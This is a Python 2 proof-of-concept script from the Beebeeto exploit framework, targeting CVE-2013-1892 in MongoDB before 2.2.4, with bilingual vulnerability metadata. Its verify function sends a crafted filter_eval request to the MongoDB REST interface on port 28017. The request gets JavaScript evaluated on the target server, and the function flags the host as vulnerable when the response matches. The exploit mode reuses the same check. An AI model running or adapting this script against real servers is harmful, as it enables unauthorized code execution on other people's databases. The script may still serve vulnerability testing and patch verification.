#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0054',  # 由Beebeeto官方编辑
            'name': 'MongoDB 2.2.4 nativeHelper 远程代码执行漏洞 POC',  # 名称
            'author': '我只会打连连看',  # 作者
            'create_date': '2014-10-05',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [28017],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Mongodb',  # 漏洞所涉及的应用名称
            'vul_version': ['<2.2.4'],  # 受漏洞影响的应用版本
            'type': 'Code Execution',  # 漏洞类型
            'tag': ['execute', 'mongodb漏洞'],  # 漏洞相关tag
            'desc': '''
                    MongoDB before 2.0.9 and 2.2.x before 2.2.4 does not properly validate
                    requests to the nativeHelper function in SpiderMonkey, which allows remote
                    authenticated users to cause a denial of service (invalid memory access and server crash)
                    or execute arbitrary code via a crafted memory address in the first argument.
                    =========
                    在2.0.9之前和在2.2.4之前的2.2.X Mongodb 不正确验证请求到在SpiderMonkey的nativeHelper函数，
                    允许远程认证用户导致一个拒绝服务（无效的内存访问和服务器的崩溃）或者通过一个精心制作的内存地址第一个
                    参数执行任意代码。
                    ''',
            'references': ['http://fofa.so/exploits/4',
                          'http://2012.zeronights.org/includes/docs/Firstov%20-%20Attacking%20MongoDB.pdf',
                          'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1892',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):  # 实现验证模式的主函数
        attack_url = '%s:28017/admin/$cmd/?filter_eval=function(){val=db.version(); return val;}&limit=1' % args['options']['target']
        try:
            req = urllib2.urlopen(attack_url)
            content = req.read()
        except:
            args['success'] = False
            return args
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url
        if req.getcode() == 200 and 'total_rows' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = attack_url
            return args
        args['success'] = False
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())